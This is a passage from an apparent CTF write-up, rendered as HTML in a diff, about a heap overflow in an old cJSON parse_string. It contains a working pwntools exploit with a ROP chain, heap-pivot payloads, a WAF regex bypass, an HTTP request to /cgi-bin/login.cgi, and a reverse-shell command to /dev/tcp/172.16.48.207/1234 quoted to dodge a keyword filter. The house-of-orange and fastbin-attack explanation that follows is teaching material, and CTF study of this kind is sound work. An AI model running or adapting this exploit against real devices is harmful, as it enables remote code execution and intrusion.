+    <span class="n">dummy_alloc_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'4'</span> <span class="o">*</span> <span class="mh">0x30</span>
+    <span class="n">dummy_alloc_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">dummy_alloc_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">','</span>
+    <span class="c1"># print("dummy_alloc_payload len {:#x}, raw_len {:#x}".format(len(dummy_alloc_payload), raw_len(dummy_alloc_payload)))</span>
+
+
+    <span class="sd">'''</span>
+<span class="sd">    gdb-peda$ x/5i 0x7fea5aabd050</span>
+<span class="sd">   0x7fea5aabd050 &lt;munmap&gt;:     mov    eax,0xb</span>
+<span class="sd">   0x7fea5aabd055 &lt;munmap+5&gt;:   syscall</span>
+<span class="sd">   0x7fea5aabd057 &lt;munmap+7&gt;:   cmp    rax,0xfffffffffffff001</span>
+<span class="sd">   0x7fea5aabd05d &lt;munmap+13&gt;:  jae    0x7fea5aabd060 &lt;munmap+16&gt;</span>
+<span class="sd">   0x7fea5aabd05f &lt;munmap+15&gt;:  ret</span>
+<span class="sd">    '''</span>
+    <span class="sd">'''</span>
+<span class="sd">    0x00000000004464e2, # xchg edx, ecx ; ret -&gt; save heap pointer</span>
+<span class="sd">    0x0000000000451151, # pop r8 ; mov dword ptr [rdx], eax ; xor eax, eax ; ret</span>
+<span class="sd">    0x0000000000450ab0 : mov rax, qword ptr [rdi + 0x28] ; ret</span>
+<span class="sd">    0x0000000000401063, # pop rdx ; pop rbx ; pop rbp ; ret</span>
+<span class="sd">    0x0000000000406862 : pop rsi ; ret</span>
+<span class="sd">    0x0000000000404cb7 : pop rdi ; ret</span>
+<span class="sd">    0x00000000004165af : add rax, rsi ; ret</span>
+<span class="sd">    0x0000000000450ab0 : mov rax, qword ptr [rdi + 0x28] ; ret</span>
+<span class="sd">    '''</span>
+    <span class="n">ropchain</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="mh">0x0000000000450ab0</span><span class="p">,</span> <span class="c1"># mov rax, qword ptr [rdi + 0x28] ; ret</span>
+        <span class="mh">0x0000000000406862</span><span class="p">,</span> <span class="c1"># pop rsi ; ret</span>
+        <span class="mh">0xa0b0</span><span class="p">,</span> <span class="c1"># system - getenv</span>
+        <span class="mh">0x00000000004165af</span><span class="p">,</span> <span class="c1"># add rax, rsi ; ret -&gt; rax-&gt;system</span>
+        <span class="mh">0x0000000000404cb7</span><span class="p">,</span> <span class="c1"># pop rdi ; ret</span>
+        <span class="mh">0x6760c8</span><span class="p">,</span> <span class="c1"># cmd address</span>
+        <span class="mh">0x0000000000408823</span><span class="p">,</span> <span class="c1"># add rsp, 0x328 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret -&gt; sastisfy system</span>
+        <span class="sa">b</span><span class="s1">'x'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x328</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),</span>
+        <span class="mh">0x000000000040853d</span><span class="p">,</span> <span class="c1"># call rax</span>
+    <span class="p">])</span>
+
+    <span class="n">CMD</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"""bas'h' -i &gt;&amp; /dev/'t'cp/172.16.48.207/1234 0&gt;&amp;1;"""</span>
+    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="p">[</span><span class="sa">b</span><span class="s1">'bash'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'flag'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'cat'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'tcp'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'"'</span><span class="p">]:</span>
+        <span class="k">assert</span> <span class="n">k</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">CMD</span><span class="p">,</span> <span class="s2">"invalid sequence {} in CMD"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+
+    <span class="c1"># CMD = b"touch /tmp/test;"</span>
+    <span class="n">pivot_payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+        <span class="mh">0x00</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4087F5</span><span class="p">),</span> <span class="c1"># .alloc -&gt; disable je in .free gadget</span>
+        <span class="c1"># .text:00000000004087F5 test    rsi, rsi</span>
+        <span class="c1"># .text:00000000004087F8 jz      short loc_408801</span>
+        <span class="c1"># .text:00000000004087F8</span>
+        <span class="c1"># .text:00000000004087FA mov     rdi, [rbx+10h]</span>
+        <span class="c1"># .text:00000000004087FE call    qword ptr [rbx+8]</span>
+        <span class="mh">0x08</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004381d3</span><span class="p">),</span> <span class="c1"># .free -&gt; xchg eax, esp ; je 0x43901d ; add rsp, 0xe8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
+        <span class="mh">0x10</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x675ec8</span> <span class="o">-</span> <span class="mh">0x28</span><span class="p">),</span> <span class="c1"># getenv@got - 0x28</span>
+        <span class="mh">0x18</span><span class="p">:</span> <span class="n">CMD</span><span class="p">,</span>
+        <span class="mh">0x118</span><span class="p">:</span> <span class="n">ropchain</span>
+    <span class="p">})</span>
+
+    <span class="n">hijack_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"ddddddddddddddddddddddddddddddddddddddd\u"   '</span>
+    <span class="n">hijack_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'e'</span> <span class="o">*</span> <span class="mh">0x5c</span>
+    <span class="n">hijack_payload</span> <span class="o">+=</span> <span class="n">pivot_payload</span>
+    <span class="n">hijack_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="c1"># hijack_payload += b','</span>
+    <span class="c1"># print("hijack_payload len {:#x}, raw_len {:#x}".format(len(hijack_payload), raw_len(hijack_payload)))</span>
+
+
+    <span class="c1"># print("message len {:#x}".format(template_len + raw_len(overflow_old_top_chunk_payload) + raw_len(overflow_new_top_chunk_payload) + raw_len(free_new_top_chunk_payload) + raw_len(overflow_fastbin_fd_payload) + raw_len(dummy_alloc_payload) + raw_len(hijack_payload)))</span>
+
+    <span class="n">array_payload</span> <span class="o">=</span> <span class="n">generate_array_payload</span><span class="p">(</span><span class="n">top_chunk_size</span> <span class="o">-</span> <span class="mh">0x1040</span> <span class="o">-</span> <span class="mh">0x50</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">template_len</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">overflow_old_top_chunk_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">overflow_new_top_chunk_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">free_new_top_chunk_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">overflow_fastbin_fd_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">dummy_alloc_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">hijack_payload</span><span class="p">))</span> 
+
+    <span class="n">payload</span> <span class="o">=</span>  <span class="n">array_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">overflow_old_top_chunk_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">overflow_new_top_chunk_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">free_new_top_chunk_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">overflow_fastbin_fd_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">dummy_alloc_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">hijack_payload</span>
+
+    <span class="n">http_body</span> <span class="o">=</span> <span class="n">json_template</span> <span class="o">%</span> <span class="n">get_raw_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">write</span><span class="p">(</span><span class="s2">"exp_data"</span><span class="p">,</span> <span class="n">http_body</span><span class="p">)</span>
+
+    <span class="n">http_template</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'''</span>
+<span class="s1">POST /cgi-bin/login.cgi HTTP/1.1</span><span class="se">\r</span><span class="s1"></span>
+<span class="s1">Host: </span><span class="si">%s</span><span class="s1">:</span><span class="si">%d</span><span class="se">\r</span><span class="s1"></span>
+<span class="s1">Content-Type: application/json</span><span class="se">\r</span><span class="s1"></span>
+<span class="s1">Content-Length: </span><span class="si">%d</span><span class="se">\r</span><span class="s1"></span>
+<span class="se">\r</span><span class="s1"></span>
+<span class="si">%s</span><span class="s1"></span>
+<span class="s1">'''</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="c1"># print(http_template)</span>
+
+    <span class="n">http_message</span> <span class="o">=</span> <span class="n">http_template</span> <span class="o">%</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">http_body</span><span class="p">),</span> <span class="n">http_body</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">http_message</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"192.168.64.135"</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="mi">8080</span>
+
+    <span class="n">exp</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</pre></div>
+<h2 data-content="1" id="69e5c998b2252f2dfe1262fc58f3e63b">English version</h2>
+<h3 data-content="1" id="9f72434d461eb50d94e7bf294172ca47">Background</h3>
+<p>The inspiration for this challenge came from a heap vulnerability that was difficult to exploit when I was analyzing a common product this year. In the process of completing the complete application, I combined and used some heap exploit tricks used in CTF competition challenges in a practical scenario for the first time. This article will introduce the causes and exploitation method of this vulnerability in the form of a writeup. Thanks to @M4x for implementing the code related to the challenge.</p>
+<p><a href="https://github.com/chaitin/Real-World-CTF-6th-Challenges/tree/main/Corrupted%20GI" target="_blank">Challenge infomation</a></p>
+<h3 data-content="1" id="41b3162a6e09daee33dc055ae7256702">Vulnerability analysis</h3>
+<p>The vulnerability exists in an open source project <a href="https://github.com/DaveGamble/cJSON" target="_blank"><code>cJSON</code></a>. In earlier versions of <code>cJSON</code> code, parsing strings in json was implemented through the following functions:</p>
+<div class="highlight"><pre><span></span><span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="nf">parse_string</span><span class="p">(</span><span class="n">cJSON</span> <span class="o">*</span><span class="n">item</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="o">=</span><span class="n">str</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr2</span><span class="p">;</span><span class="kt">char</span> <span class="o">*</span><span class="n">out</span><span class="p">;</span><span class="kt">int</span> <span class="n">len</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="kt">unsigned</span> <span class="n">uc</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">str</span><span class="o">!=</span><span class="sc">'\"'</span><span class="p">)</span> <span class="p">{</span><span class="n">ep</span><span class="o">=</span><span class="n">str</span><span class="p">;</span><span class="k">return</span> <span class="mi">0</span><span class="p">;}</span>  <span class="cm">/* not a string! */</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">!=</span><span class="sc">'\"'</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">&amp;&amp;</span> <span class="o">++</span><span class="n">len</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span> <span class="o">==</span> <span class="sc">'\\'</span><span class="p">)</span> <span class="n">ptr</span><span class="o">++</span><span class="p">;</span>  <span class="cm">/* Skip escaped quotes. */</span>
+
+    <span class="n">out</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">cJSON_malloc</span><span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="cm">/* This is how long we need for the string, roughly. */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">out</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">ptr</span><span class="o">=</span><span class="n">str</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span><span class="n">ptr2</span><span class="o">=</span><span class="n">out</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">!=</span><span class="sc">'\"'</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">!=</span><span class="sc">'\\'</span><span class="p">)</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=*</span><span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+            <span class="k">switch</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="k">case</span> <span class="sc">'b'</span><span class="o">:</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=</span><span class="sc">'\b'</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'f'</span><span class="o">:</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=</span><span class="sc">'\f'</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'n'</span><span class="o">:</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=</span><span class="sc">'\n'</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'r'</span><span class="o">:</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=</span><span class="sc">'\r'</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'t'</span><span class="o">:</span> <span class="o">*</span><span class="n">ptr2</span><span class="o">++=</span><span class="sc">'\t'</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                <span class="k">case</span> <span class="sc">'u'</span><span class="o">:</span>    <span class="cm">/* transcode utf16 to utf8. DOES NOT SUPPORT SURROGATE PAIRS CORRECTLY. */</span>
+                    <span class="n">sscanf</span><span class="p">(</span><span class="n">ptr</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s">"%4x"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">uc</span><span class="p">);</span>    <span class="cm">/* get the unicode char. */</span>
+                    <span class="n">len</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span><span class="k">if</span> <span class="p">(</span><span class="n">uc</span><span class="o">&lt;</span><span class="mh">0x80</span><span class="p">)</span> <span class="n">len</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">uc</span><span class="o">&lt;</span><span class="mh">0x800</span><span class="p">)</span> <span class="n">len</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span><span class="n">ptr2</span><span class="o">+=</span><span class="n">len</span><span class="p">;</span>
+
+                    <span class="k">switch</span> <span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">case</span> <span class="mi">3</span><span class="o">:</span> <span class="o">*--</span><span class="n">ptr2</span> <span class="o">=</span><span class="p">((</span><span class="n">uc</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xBF</span><span class="p">);</span> <span class="n">uc</span> <span class="o">&gt;&gt;=</span> <span class="mi">6</span><span class="p">;</span>
+                        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span> <span class="o">*--</span><span class="n">ptr2</span> <span class="o">=</span><span class="p">((</span><span class="n">uc</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xBF</span><span class="p">);</span> <span class="n">uc</span> <span class="o">&gt;&gt;=</span> <span class="mi">6</span><span class="p">;</span>
+                        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> <span class="o">*--</span><span class="n">ptr2</span> <span class="o">=</span><span class="p">(</span><span class="n">uc</span> <span class="o">|</span> <span class="n">firstByteMark</span><span class="p">[</span><span class="n">len</span><span class="p">]);</span>
+                    <span class="p">}</span>
+                    <span class="n">ptr2</span><span class="o">+=</span><span class="n">len</span><span class="p">;</span><span class="n">ptr</span><span class="o">+=</span><span class="mi">4</span><span class="p">;</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="k">default</span><span class="o">:</span>  <span class="o">*</span><span class="n">ptr2</span><span class="o">++=*</span><span class="n">ptr</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="o">*</span><span class="n">ptr2</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">==</span><span class="sc">'\"'</span><span class="p">)</span> <span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+    <span class="n">item</span><span class="o">-&gt;</span><span class="n">valuestring</span><span class="o">=</span><span class="n">out</span><span class="p">;</span>
+    <span class="n">item</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">=</span><span class="n">cJSON_String</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">ptr</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>It can be found that the code mainly has the following steps:</p>
+<ul>
+<li>1 Calculate the string length (calculated by looking for the second <code>"</code>)</li>
+<li>2 Alloc memory</li>
+<li>3 Write characters to memory (decode if needed)</li>
+</ul>
+<p>During the decoding process, when <code>'\u'</code> is encountered, <code>ptr+=4</code> will eventually be executed. If <code>ptr+4</code> skips bytes, there happens to be the second <code>"</code> found in the first step of calculating the length, then a heap overflow can occur. An attacker can easily control the requested memory size and overflow length by inputting any json string.</p>
+<h3 data-content="1" id="ad5a7f754896b045a01a677ecb30e0c1">How to exploit</h3>
+<p>There are several main difficulties in completing the utilization:</p>
+<ul>
+<li>Need to bypass waf filtering (we simulated the waf scenario that exists in the actual scenario)</li>
+<li>There is no free during the process of parsing json, and there is no memory pointer or function pointer available on the heap</li>
+</ul>
+<p>The main problem brought by the first point is that the length of the payload is limited. The attacker needs to use a shorter payload to apply for a large amount of heap memory to prepare for subsequent exploitation. By reversing or reading the cjson code, you can find that you can malloc a large amount of memory with a short payload through an array ([1,1,....]). But waf also uses the regular expression "\"\s<em>:\s</em>\[" to filter the array. To bypass this rule, a parsing difference between cjson and pcre2 is used. Customized ones are used in cjson The skip function skips all characters ≤ 0x20</p>
+<div class="highlight"><pre><span></span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="kr">__cdecl</span> <span class="nf">skip</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">in</span><span class="p">)</span>
+<span class="p">{</span>
+   <span class="k">while</span> <span class="p">(</span> <span class="n">in</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">in</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">in</span> <span class="o">&lt;=</span> <span class="mh">0x20u</span> <span class="p">)</span>
+     <span class="o">++</span><span class="n">in</span><span class="p">;</span>
+   <span class="k">return</span> <span class="n">in</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>The \s of pcre2 will only match whitespace characters (\n, \r, \t, spaces, etc.), so you only need to use the special characters in the difference between the two to bypass the regular rules, and you can also use arrays, such as "a:\x01[1,1]"</p>
+<p>For the second point, you need to use <code>house of orange</code>. <code>house of orange</code> is a heap exploit trick that appeared in the 2016 HITCON CTF Quals. Through this trick, an attacker can malloc a large amount of heap and eventually cause the glibc heap manager to free a certain block of heap memory without the program itself being able to trigger free. You can read <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c" target="_blank">how2heap examples</a> or other articles to learn this heap exploit trick.</p>
+<p>Here are some pictures to explain how to construct a fastbin attack through house of orange in this challenge.</p>
+<ul>
+<li>json allows data to be passed in the form of dictionaries, arrays, etc. In <code>cJSON</code>, separate memory needs to be allocated for each item of the array. Therefore, we can allocate a large amount of heap in the form of a large number of arrays to make the top chunk small enough.</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240130151157-dad58cd4-bf3e-1.png"/></p>
+<ul>
+<li>Then malloc a large memory, so that topchunk cannot meet the requirements and is freed (<code>house of orange</code>)</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240130151236-f1c4f042-bf3e-1.png"/></p>
+<ul>
+<li>Repeat the above steps to construct a free chunk again</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240130151253-fc29e8d0-bf3e-1.png"/></p>
+<ul>
+<li>Malloc the first free chunk, overflow to the second free chunk through the vulnerability, and now we can do fastbin attack</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240130151309-05afcbcc-bf3f-1.png"/></p>
+<p><code>fastbin attack</code> can be constructed in the above way. After that, you can use <code>fastbin attack</code> to modify the function pointer of the data segment, jump to ROP and finally complete the exploit (PS: The interesting point here is that if there is no function pointer stored in the data segment by protobuf, when Full RELRO is turned on, this vulnerability cannot be exploited.)</p>
+<p>The complete exploit script is as follows:</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">"amd64"</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>
+
+<span class="c1"># POST /cgi-bin/login.cgi HTTP/1.1</span>
+<span class="c1"># Accept: application/json, */*</span>
+<span class="c1"># Accept-Encoding: gzip, deflate</span>
+<span class="c1"># Connection: keep-alive</span>
+<span class="c1"># Content-Length: 171</span>
+<span class="c1"># Content-Type: application/json</span>
+<span class="c1"># Host: 192.168.64.135:8080</span>
+<span class="c1"># User-Agent: HTTPie/1.0.3</span>
+<span class="c1"># </span>
+<span class="c1"># {"data": "BICWCZDNNFXBEK3IOR2HA4Z2F4XXO53XFZ4W65LUOVRGKLTDN5WS653BORRWQP3WHUWVC4LQIV3E4MSYMQ4BQAQ", "timestamp": 61866, "data": "aaaa\u" aaaaaaaabaaaaaaacaaaaaaadaaaaaaa"}</span>
+
+<span class="n">blacklist_dict</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\b</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">b"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\f</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">f"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">n"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\r</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">r"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">t"</span><span class="p">,</span>
+
+    <span class="sa">b</span><span class="s2">";"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u003b"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"$"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0024"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"|"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u007c"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"`"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0060"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"&amp;"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0026"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"#"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0023"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">"("</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0028"</span><span class="p">,</span>
+    <span class="sa">b</span><span class="s2">")"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0029"</span><span class="p">,</span>
+
+    <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">:</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">u0000"</span><span class="p">,</span>
+    <span class="c1"># bash, flag, cat, tcp</span>
+<span class="p">}</span>
+
+
+
+<span class="k">def</span> <span class="nf">get_raw_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="c1"># breakpoint()</span>
+    <span class="n">raw_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"latin"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">blacklist_dict</span><span class="p">:</span>
+            <span class="n">raw_payload</span> <span class="o">+=</span> <span class="n">blacklist_dict</span><span class="p">[</span><span class="n">c</span><span class="p">]</span>
+
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">raw_payload</span> <span class="o">+=</span> <span class="n">c</span>
+
+    <span class="k">return</span> <span class="n">raw_payload</span>
+
+<span class="k">def</span> <span class="nf">calc_array_pair_cnt</span><span class="p">(</span><span class="n">required_size</span><span class="p">,</span> <span class="n">message_len</span><span class="p">):</span>
+    <span class="n">align_up_0x10</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mh">0x0f</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xf</span>
+    <span class="n">remain_chunk_length</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0x0f</span><span class="p">)</span> <span class="o">//</span> <span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x10</span>
+
+    <span class="n">string_len</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">n</span> <span class="o">+</span> <span class="n">message_len</span> <span class="c1"># 1,1,</span>
+    <span class="n">calc</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="mh">0x50</span> <span class="o">*</span> <span class="n">n</span> <span class="o">+</span> <span class="n">align_up_0x10</span><span class="p">(</span><span class="n">string_len</span><span class="p">(</span><span class="n">n</span><span class="p">))</span> <span class="o">+</span> <span class="n">remain_chunk_length</span><span class="p">(</span><span class="n">string_len</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">):</span>
+        <span class="n">size</span> <span class="o">=</span> <span class="n">calc</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="n">required_size</span><span class="p">:</span>
+            <span class="k">continue</span>
